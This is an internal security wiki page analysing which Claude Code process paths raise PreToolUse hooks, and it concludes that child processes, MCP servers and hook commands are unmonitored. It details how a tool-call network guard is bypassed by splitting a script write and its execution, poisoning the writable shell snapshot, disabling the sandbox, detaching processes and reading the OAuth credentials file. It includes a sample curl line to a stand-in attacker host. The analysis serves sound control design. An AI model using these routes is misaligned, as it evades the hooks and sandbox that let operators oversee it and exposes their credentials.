---
title: Claude Code execution model — how processes are created, and which paths hooks see
wiki_id: claude-code-execution-model
question: When Claude Code runs code, what process is created by what, and which process-creation paths raise a `PreToolUse: Bash` event?
subject: Claude Code
status: partial
last_verified: 2026-08-20
verified_against: |
  https://code.claude.com/docs/en/tools-reference, fetched 2026-08-20;
  https://code.claude.com/docs/en/hooks, fetched 2026-08-20;
  https://code.claude.com/docs/en/sandboxing, fetched 2026-08-20;
  https://code.claude.com/docs/en/interactive-mode, fetched 2026-08-20;
  https://code.claude.com/docs/en/skills, fetched 2026-08-20;
  https://code.claude.com/docs/en/settings, fetched 2026-08-20;
  https://code.claude.com/docs/en/env-vars, fetched 2026-08-20 (TRUNCATED — see §9).
  Local observation: Claude Code CLI, `CLAUDE_CODE_ENTRYPOINT=cli`, Linux 6.19.11 kali-arm64,
  zsh 5.9 login shell, session of 2026-08-20. No product version string was obtainable from
  inside the session; observations are pinned to a date, not a build.
recheck_trigger: >
  before writing or amending any control whose guarantee is "the agent cannot do X", and before
  any claim to a client that RedGold's hooks bound what ran on the machine; also if
  code.claude.com/docs/en/tools-reference changes its "Bash tool behavior" section, or if the
  observed `zsh -c source <snapshot> && eval '<cmd>'` wrapper shape changes.
sources:
  - url: https://code.claude.com/docs/en/tools-reference
    kind: primary
  - url: https://code.claude.com/docs/en/hooks
    kind: primary
  - url: https://code.claude.com/docs/en/sandboxing
    kind: primary
  - url: https://code.claude.com/docs/en/interactive-mode
    kind: primary
  - url: https://code.claude.com/docs/en/skills
    kind: primary
  - url: https://code.claude.com/docs/en/settings
    kind: primary
  - url: https://code.claude.com/docs/en/env-vars
    kind: primary
related:
  - claude-code-hooks
  - redgold-execution-model-notes
---

# Claude Code execution model

## 0. The one-sentence answer

**Hooks fire on tool calls, not on process creation.** A `PreToolUse: Bash` hook sees the string
Claude asked to run; it does not see, and cannot see, any process that string goes on to create.
Every process below the first one is unhooked, unlogged and unconstrained by anything RedGold
installs in the harness.

---

## 1. Lead table — which process-creation paths raise a `Bash` `PreToolUse` event

"Hooked" below means specifically: *a `PreToolUse` hook with matcher `Bash` runs, receives the
command string on stdin, and can deny by exit 2 or `permissionDecision: "deny"`.*

| # | How the process comes into existence | `PreToolUse: Bash`? | What does fire | Evidence |
|---|---|---|---|---|
| 1 | `Bash` tool call | **Yes** | `PreToolUse`, `PostToolUse`/`PostToolUseFailure`, `PermissionRequest`, `PostToolBatch` | `[SOURCE: cc-hooks-docs]` |
| 2 | `Bash` tool call with `run_in_background: true` | **Yes** — it is an ordinary `Bash` call that returns early | same as row 1 | `[INFERRED]` from `run_in_background` being a `Bash` tool input `[SOURCE: cc-tools-ref]`; not stated explicitly `[VERIFY]` |
| 3 | A foreground `Bash` call moved to background by `Ctrl+B`, or auto-backgrounded at timeout | **Yes, already fired** — the move happens after the call was approved | nothing additional | `[SOURCE: cc-interactive]`, `[SOURCE: cc-tools-ref]` |
| 4 | A **subagent's** own `Bash` call | **Yes**, unconditionally | same as row 1, plus `agent_id`/`agent_type` on stdin | `[SOURCE: cc-hooks-docs]` — quoted in §5 |
| 5 | A skill's `` !`command` `` context injection | **Yes** — it runs *through the Bash tool* | same as row 1; permission rules apply and a deny aborts the skill invocation | `[SOURCE: cc-skills]` — quoted in §5 |
| 6 | **A child process of a `Bash` command** (`bash -c`, `sh script.sh`, `python3 -c 'os.system(…)'`, `make`, `npm run`, `nohup`, `setsid`, a re-exec, a daemon that outlives the call) | **NO** | nothing at all | Observed §4; `[SOURCE: cc-tools-ref]` for the contrasting statement, §4 |
| 7 | **stdio MCP server startup** — the server process and its own children | **NO** | no hook event is documented for server startup | Observed §6; docs silent on startup `[VERIFY]` |
| 8 | An **MCP tool call** on an already-running server | No `Bash` event — but a `PreToolUse` fires under the name `mcp__<server>__<tool>` | `PreToolUse`, `PostToolUse`, `PermissionRequest`, … | `[SOURCE: cc-hooks-docs]` |
| 9 | **A hook command's own execution** | **NO** `[INFERRED]` | nothing | §7 — docs are silent `[VERIFY]`; `sh -c` spawn is `[SOURCE: cc-hooks-docs]` |
| 10 | **Status line command** | **NO** `[INFERRED]` | nothing | listed as a distinct subprocess category `[SOURCE: cc-env-vars]` |
| 11 | **`apiKeyHelper`** — "run through the system shell (`/bin/sh` …)" | **NO** `[INFERRED]` | nothing | `[SOURCE: cc-settings]` |
| 12 | Operator **`!` shell mode** at the prompt | **Unknown** `[VERIFY]` — docs say it "doesn't require Claude to interpret or approve the command" | unknown | `[SOURCE: cc-interactive]` for the quote; hook behaviour not stated |
| 13 | **tmux sessions** Claude Code spawns | **NO** `[INFERRED]` — listed as its own subprocess category, not a `Bash` call | unknown `[VERIFY]` | `[SOURCE: cc-env-vars]` |
| 14 | `WebFetch` / `WebSearch` | No `Bash` event — no local process either, but **this is network egress** | `PreToolUse` under `WebFetch`/`WebSearch` | `[SOURCE: cc-hooks-docs]` |
| 15 | Worktree creation (`--worktree`, `isolation: "worktree"`) | No `Bash` event | `WorktreeCreate` — **any** non-zero exit fails it | `[SOURCE: cc-hooks-docs]` |
| 16 | Anything the **operator** runs in another terminal on the same machine | **NO** | nothing | trivially true; stated because it is the same trust boundary |

**The finding is rows 6, 7, 9, 10, 11 and 13**: six ways a process comes into existence on the
machine without a `Bash` `PreToolUse` event ever being raised. Row 6 is the one that matters,
because it is the one an agent controls.

---

## 2. The execution model, observed

The Bash tool's shape is not inferred here — it is visible in `/proc/<pid>/cmdline` from inside the
call. Observed verbatim on 2026-08-20 (command body elided, wrapper preserved):

```
/usr/bin/zsh -c source /home/hiranya/.claude/shell-snapshots/snapshot-zsh-1787195150315-bsydpq.sh \
  2>/dev/null || true \
  && setopt NO_EXTENDED_GLOB NO_BARE_GLOB_QUAL 2>/dev/null || true \
  && eval '<the command Claude emitted>' < /dev/null \
  && pwd -P >| /tmp/claude-<id>-cwd
```

Reading that line answers most of §1:

- **The shell is the operator's login shell**, not a fixed `/bin/bash` — `/usr/bin/zsh` here,
  because `$SHELL=/usr/bin/zsh`. A hook that assumes bash semantics for the command it is handed is
  assuming something this machine does not do `[INFERRED from observation]`.
- **The command arrives via `eval`**, inside a single-quoted string built by the harness. Quoting is
  the harness's problem, not the hook's, but it means the string a hook inspects and the string
  `eval` sees are the same text.
- **cwd persistence is a file, not a session.** The wrapper ends with `pwd -P >| /tmp/claude-<id>-cwd`.
  The next call is spawned with that recorded directory as its cwd. That is the exact mechanism that
  produces *persistent working directory with non-persistent shell state*: there is no surviving
  shell to hold state in — only one recorded string that the harness replays as a spawn parameter
  `[INFERRED from observation]`.
- **`< /dev/null`** — commands get no stdin from the session.

### Observed: one process per call, not a persistent shell

| Call | shell PID | `RG_TEST_VAR` (exported in call 2) |
|---|---|---|
| 1 | 554583 | — |
| 2 | 554666 | `UNSET` |
| 3 | 554730 | `UNSET` |

Three calls, three PIDs, and an `export` in one call invisible in the next. The parent of each is
PID 330300, `claude --dangerously-skip-permissions` — i.e. **each Bash call is a direct child of the
Claude Code process; there is no intermediate persistent shell** `[INFERRED from observation]`.

The documentation agrees, verbatim `[SOURCE: cc-tools-ref]`:

> "The Bash tool runs each command in a separate process."

> "Environment variables don't persist. An `export` in one command won't be available in the next."

> "When Claude runs `cd` in the main session, the new working directory carries over to later Bash
> commands as long as it stays inside the project directory or an additional working directory…
> **Subagent sessions never carry over working directory changes.**"

> "Aliases and shell functions defined in your shell startup file are available. At session start,
> Claude Code sources `~/.zshrc`, `~/.bashrc`, or `~/.profile` depending on your shell, captures the
> resulting aliases, functions, and shell options, and applies them to every Bash command."

So the harness's in-session note — "working directory persists between calls, but shell state does
not persist; the shell is initialized from the user's profile" — is **confirmed and made precise**:
"initialized from the user's profile" means *sourced from a snapshot file captured once at session
start*, not re-read from `~/.zshrc` per call.

**One documented divergence, observed.** The `cd` in call 2 above did *not* carry into call 3. That
is not a contradiction: these calls ran in a **subagent**, and the doc states subagent sessions never
carry cwd over. Main-session cwd carry-over was therefore **not** observed here and rests on the
doc alone `[VERIFY]` — as does `CLAUDE_BASH_MAINTAIN_PROJECT_WORKING_DIR=1`, which the doc says
disables the carry-over.

### The shell snapshot is a hook-blind input to every future call

The snapshot file is sourced **from disk on every Bash call** — the path appears literally in each
call's `cmdline`, and the same path appeared in a concurrently-running call's `cmdline`. Observed
mode `664`, owned by the operator, and **writable by any process the agent starts**.

Consequence, stated plainly: **anything appended to that file executes at the top of every
subsequent Bash tool call, before the command a `PreToolUse` hook inspected.** The hook receives
`tool_input.command`; it never sees the snapshot. A shell function defined there can shadow `curl`,
`python3`, or any binary the guard reasons about. This is `[INFERRED from observation]` — it follows
from the sourcing being observed and the file being observed writable; it was **not** tested by
writing to the file, which this session's read-only remit forbids. The sandbox documentation warns
about the same class of move in its own words `[SOURCE: cc-sandboxing]`:

> "a sandboxed command can write files that later commands run or read, such as shell startup files,
> executables on `$PATH`, or `~/.claude/settings.json`, and use them to widen its own access on the
> next run."

---

## 3. Lifetime

A `Bash` call's process lives until the command exits, the timeout expires, or the session ends —
but **a child it started is not bound by any of those** unless the child chose to be. Observed: a
`setsid nohup python3 …` child ran to completion with `ppid` outside the call's process group.

Documented lifetimes, verbatim `[SOURCE: cc-tools-ref]`:

> "When a command reaches its timeout without finishing, Claude Code moves it to the background
> instead of stopping it."

> "When a subagent running in the foreground started the command, Claude Code ends it when that
> subagent gives its final response. Commands started by the main conversation or by a background
> subagent keep running."

Default timeout is two minutes (`BASH_DEFAULT_TIMEOUT_MS`), ceiling ten minutes
(`BASH_MAX_TIMEOUT_MS`) `[SOURCE: cc-tools-ref]`. These bound *the tool call*. They do not bound a
detached grandchild.

---

## 4. Nested and inherited execution — confirmed, not assumed

**Nothing hooks a child process.** There is no syscall interception, no `ptrace`, no `LD_PRELOAD`,
no cgroup, and no `fork`/`execve` event in the hook catalogue — the 31 events in
[hooks.md](hooks.md) are scoped to turns, tool calls, tool batches, subagents, tasks, worktrees and
sessions, and **none is scoped to a process**.

The documentation states the same boundary for the adjacent case of file-access deny rules
`[SOURCE: cc-tools-ref]`, and this is the closest thing to an explicit admission in the docs:

> "Read and Edit deny rules also apply to file commands Claude Code recognizes in Bash, such as
> `cat`, `head`, `tail`, `sed`, and `grep`, **but not to arbitrary subprocesses that read or write
> files indirectly, like a Python or Node script that opens files itself.** For OS-level enforcement
> that covers every process, enable the sandbox."

Read that sentence twice. It concerns file rules, not network scope, so it is *not* a direct
statement about `scope_guard.py` — but the mechanism it describes is identical, and the remedy it
names ("OS-level enforcement that covers every process") is the sandbox, not a hook.

Observed corroboration: a probe script was executed as (a) a direct child, (b) a grandchild via
`python3 → bash -c → python3`, and (c) a `setsid nohup` detached process. All three ran. No
mechanism in the harness was in a position to see (b) or (c) at all — they were never described to
the model, never serialised into a tool call, and never crossed the harness.

### What this means for `scope_guard.py` — with the hole verified

`scope_guard.py`'s own docstring already concedes §9.3.1: `echo 'curl …' > /tmp/a.sh && bash
/tmp/a.sh` defeats it. **That is the same hole as row 6 of §1**, and the page should say so — the
guard is not being defeated by a clever string, it is being defeated by the fact that the second
process was never a tool call.

Executed against the current `scripts/scope_guard.py` on 2026-08-20 (read-only, no network):

| Command handed to `extract_hosts("Bash", …)` | Result | Effect |
|---|---|---|
| `echo 'curl https://evil.example/x' > /tmp/a.sh && bash /tmp/a.sh` | `Undeterminable` | **deny** — the spec's own example is caught |
| `bash /tmp/a.sh` | `set()` | **allow, and no ledger row** |
| `python3 /tmp/a.py` | `set()` | **allow, and no ledger row** |
| `./a.out` | `set()` | **allow, and no ledger row** |
| `make deploy` | `set()` | **allow, and no ledger row** |
| `npm run start` | `set()` | **allow, and no ledger row** |

The mechanism: `extract_hosts` returns early with an empty set when `touches_network` is false, and
`touches_network` is a token match against `NETWORK_TOOLS` plus a URL regex. A command that only
*starts a program* names no network tool and contains no URL, so it is correctly classified as "not
this control's business" — and the program then does whatever it likes.

The practically important consequence is sharper than the spec's example: **splitting the write and
the execution across two tool calls defeats the guard where the single-command form does not.** The
one-liner trips `SCRIPT_EXEC_RE` only because the word `curl` is still in the same string.

This is not a defect in `scope_guard.py`. It is the correct behaviour of a control sited at the
tool-call layer, and it is exactly why `CLAUDE.md` says the boundary is the network.

### The only documented mechanism that does cover children

The Bash sandbox, verbatim `[SOURCE: cc-sandboxing]`:

> "you define which files and network domains commands can touch, and **the operating system
> enforces that boundary for every Bash command and its child processes.**"

> "These paths are enforced at the OS level, so all commands running inside the sandbox, **including
> their child processes**, respect them."

Mechanism: `bubblewrap` for filesystem isolation, `socat` relaying network traffic through a sandbox
proxy, and an optional seccomp filter for Unix-domain-socket blocking; macOS uses Seatbelt; Linux
and WSL2 only, no native Windows `[SOURCE: cc-sandboxing]`.

Two caveats that must travel with any claim about it:

1. **The model can turn it off.** `[SOURCE: cc-sandboxing]`: "when a command fails because of sandbox
   restrictions, Claude analyzes the failure and may retry the command with the
   `dangerouslyDisableSandbox` parameter." That parameter is present on the `Bash` tool schema in
   this very session. It is disabled only by setting `"allowUnsandboxedCommands": false` (the
   `/sandbox` Overrides tab's **Strict sandbox mode**), which makes the parameter "completely
   ignored".
2. **It was not enabled on this machine.** No `sandbox` key exists in `~/.claude/settings.json`, and
   no project settings file exists (observed). Everything in §4 was observed *unsandboxed*, which is
   the configuration RedGold currently develops in.

---

## 5. Subagents and skills — the two paths that *are* hooked

Both were checked because the spec relies on them.

**Subagents.** Verbatim `[SOURCE: cc-hooks-docs]`:

> "Hooks from settings files, managed policy settings, and plugins also run inside subagents. When a
> subagent calls a tool, tool events such as `PreToolUse` and `PostToolUse` fire the same configured
> hooks as in the main conversation, and the input carries the `agent_id` and `agent_type` common
> input fields that identify the subagent."

> `agent_id` — "Present only when the hook fires inside a subagent call. Use this to distinguish
> subagent hook calls from main-thread calls."

The spec's claim is **confirmed**. Note the corollary in §2: subagents never inherit cwd carry-over,
so a hook resolving an engagement root from `cwd` gets the project directory inside a subagent, not
wherever a previous call `cd`-ed to.

**Skill shell injection.** A skill body may contain `` !`command` ``, whose output is substituted
before Claude sees the skill. Verbatim `[SOURCE: cc-skills]`:

> "Every combination runs the commands through the Bash tool or the PowerShell tool, except one that
> fails the invocation outright."

> "Either tool runs the commands the same way it runs Claude's own shell commands."

So this path is hooked, and a deny is effective: "A matching ask or deny rule still aborts the
invocation regardless of `allowed-tools`." Whether `PreToolUse` specifically fires is `[INFERRED]`
from "through the Bash tool" — the docs do not name the hook event `[VERIFY]`.

Two adjacent facts worth carrying: `disableSkillShellExecution: true` in settings replaces every such
command with `[shell command execution disabled by policy]`, and **`allowed-tools` in a skill's
frontmatter is not gated by workspace trust** — "A skill can grant itself broad tool access, so
review the `allowed-tools` of skills checked into a repository before you run Claude Code there"
`[SOURCE: cc-skills]`.

---

## 6. MCP servers — separate processes, no `Bash` event

Observed on this machine, started at session start (13:05:37, the same second the `claude` process
started) as a **direct child of the Claude Code process**:

```
330373  330300  npm exec chrome-devtools-mcp@1.7.0
330637  330373  sh -c "chrome-devtools-mcp"
330638  330637  chrome-devtools-mcp
330649  330638  node …/telemetry/watchdog/main.js --parent-pid=330638
```

Four processes — including a `sh -c` and a network-capable browser-driver — with **no `Bash` tool
call and therefore no `Bash` `PreToolUse` event**. Their lifetime is the session's, not a tool
call's.

What *is* hooked is the MCP **tool call**, verbatim `[SOURCE: cc-hooks-docs]`: "MCP server tools
appear as regular tools in tool events (`PreToolUse`, `PostToolUse`, `PostToolUseFailure`,
`PermissionRequest`, `PermissionDenied`), so you can match them the same way you match any other tool
name," under `mcp__<server>__<tool>`, or `mcp__plugin_<plugin>_<server>__<tool>` for plugin-bundled
servers.

The docs do not state whether starting or connecting to an MCP server raises any hook event
`[VERIFY]`. No such event appears in the 31-event catalogue in [hooks.md](hooks.md).

---

## 7. Do hooks trigger hooks?

**The documentation is silent** on hook recursion `[VERIFY]`. What is documented is how a hook
command is launched `[SOURCE: cc-hooks-docs]`:

> "The `command` string is passed to a shell: `sh -c` on macOS and Linux, Git Bash on Windows, or
> PowerShell when Git Bash isn't installed."

> "Handlers run in the current directory with Claude Code's environment."

And `[SOURCE: cc-env-vars]`, in the `CLAUDECODE` entry, enumerates the subprocess categories Claude
Code spawns as distinct kinds:

> "Set to `1` in subprocesses Claude Code spawns (Bash and PowerShell tools, tmux sessions, hook
> commands, status line commands, stdio MCP server subprocesses)."

**`[INFERRED]`: a hook's own execution does not raise hook events.** A hook command is spawned
directly by the harness via `sh -c`; it is not a tool call, and `PreToolUse` fires on tool calls.
The enumeration above treats "hook commands" as a category *beside* "Bash tool", not a case of it. A
recursing hook would also be an obvious infinite loop, which the product does not exhibit. This is
solid reasoning and it is still not a documented guarantee — do not build a control whose
correctness depends on hooks never re-entering without testing it.

The same reasoning applies to status line commands and to `apiKeyHelper`, which `[SOURCE:
cc-settings]` describes as "run through the system shell (`/bin/sh` on macOS and Linux, `cmd` on
Windows), to generate an auth value."

---

## 8. Environment and credential inheritance

Observed in a `Bash` call on 2026-08-20: 72 environment variables. What is present and what is not:

**Set by Claude Code** (observed; `[SOURCE: cc-env-vars]` for `CLAUDECODE`):
`CLAUDECODE=1`, `CLAUDE_CODE_ENTRYPOINT=cli`, `CLAUDE_CODE_EXECPATH`, `CLAUDE_CODE_SESSION_ID`,
`CLAUDE_CODE_CHILD_SESSION=1`, `CLAUDE_EFFORT`. Hook commands additionally get `CLAUDE_PROJECT_DIR`,
`CLAUDE_PLUGIN_ROOT`, `CLAUDE_PLUGIN_DATA` `[SOURCE: cc-hooks-docs]`.

**Not present in this session:** no `ANTHROPIC_API_KEY`, no `ANTHROPIC_*` at all, no `AWS_*`, no
proxy variables. That is a property of *this* auth mode (claude.ai OAuth), not a guarantee. On a
machine using `ANTHROPIC_API_KEY` or Bedrock, those variables are ordinary environment and would be
inherited by every `Bash` call and every child of one — `[INFERRED]`, since environment inheritance
is unconditional absent scrubbing.

**Present and load-bearing anyway:**

- `SSH_AUTH_SOCK` and `SSH_AGENT_PID` are inherited. A spawned process can therefore *use* the
  operator's SSH agent — authenticating to any host the agent holds a key for — without reading a
  key file. Observed here as reachable but empty ("The agent has no identities"), so the risk is
  conditional on the operator's agent state, not on anything RedGold controls.
- `PATH` includes `/home/hiranya/RedGold/bin` and two plugin `bin/` directories.

**The credentials are on disk and readable.** `~/.claude/.credentials.json` is mode `600`, owned by
the operator — and every process a `Bash` call starts runs as that same uid. Confirmed by reading it
from three positions: a direct child, a grandchild via `python3 → bash -c → python3`, and a
`setsid nohup` detached process. All three read it. Its contents are a `claudeAiOauth` object
holding `accessToken`, `refreshToken`, `expiresAt`, `refreshTokenExpiresAt`, `scopes`,
`subscriptionType`, `rateLimitTier`. (Key *names* only are recorded here; no token value was read
into context.) `~/.claude.json`, also mode `600`, is readable the same way.

**Stated plainly: a process spawned by a `Bash` call can read the credentials Claude Code itself
uses to authenticate — including the refresh token.** Unix file permissions cannot separate them,
because there is only one uid.

**What the product offers against this** `[SOURCE: cc-sandboxing]`:

- `sandbox.credentials.files` / `sandbox.credentials.envVars`, each `"mode": "deny"` or `"mask"`.
  Denied files are blocked for reads inside the sandbox; denied variables "are unset before each
  sandboxed command runs". Two limits, both quoted: "There is no built-in credential deny list, so
  only the files and variables you list are restricted," and "The setting affects sandboxed Bash
  commands only."
- `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB` — "To strip Anthropic and cloud provider credentials from all
  subprocesses regardless of sandboxing, set `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB`." It also forces
  filesystem isolation on: "Claude Code ignores `filesystem.disabled` from every source, including
  managed settings." Its exact accepted values and the exact variable list it scrubs were **not
  retrieved** — see §9.

Note what neither mechanism does: `SUBPROCESS_ENV_SCRUB` scrubs *environment*, and the OAuth token
here lives in a *file*. Protecting the file requires `sandbox.credentials.files` with the sandbox
enabled, or a different uid.

---

## 9. Documents that could not be fully retrieved

`https://code.claude.com/docs/en/env-vars` returned truncated content on fetch (2026-08-20): the
full entries for `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB`, `CLAUDE_ENV_FILE` and
`CLAUDE_CODE_DISABLE_BACKGROUND_TASKS` were cut off. The `CLAUDECODE` and
`CLAUDE_BASH_MAINTAIN_PROJECT_WORKING_DIR` entries quoted above *were* retrieved verbatim from that
page. The `SUBPROCESS_ENV_SCRUB` behaviour in §8 is quoted from
`https://code.claude.com/docs/en/sandboxing`, which is a primary Anthropic source but is the
*sandboxing* page describing the variable in passing, not the variable's own reference entry.
Recorded in `/home/hiranya/REDGOLD-NEEDS-FROM-YOU.md` under "Documents to retrieve".

---

## 10. What is still `[VERIFY]` on this page

Listed together so a reader can see the shape of what is unproven, rather than hunting inline tags:

1. Whether `run_in_background: true` raises `PreToolUse` before the task detaches (row 2). Believed
   yes; not stated.
2. Whether operator `!` shell mode raises tool events (row 12). Not stated anywhere found.
3. Whether tmux sessions Claude Code spawns raise anything (row 13).
4. Whether MCP server *startup* raises any hook event (§6).
5. Whether a hook command's execution re-enters hooks (§7). `[INFERRED]` no.
6. Whether the skill `` !`cmd` `` path fires `PreToolUse` specifically, as opposed to merely running
   "through the Bash tool" (§5).
7. Main-session cwd carry-over (§2) — documented, not observed, because observation happened in a
   subagent where the doc says it does not apply.
8. Snapshot-file write persistence (§2) — inferred from two observations, deliberately not tested.

Items 1, 2, 3, 4 and 6 are answerable with one afternoon of instrumentation: install a `PreToolUse`
hook with matcher `.*` that appends `hook_event_name`, `tool_name`, `agent_id` and the raw stdin to
a file, then exercise each path. Item 5 is answerable the same way. **None of them changes §0** —
they change how many rows of §1 read "NO" versus "unknown", not whether children are hooked.

## Related

- [Claude Code hooks reference](hooks.md) — the 31 events, cadence, and what exit 2 does per event.
- [What the execution model means for RedGold's controls](execution-model-redgold-notes.md).
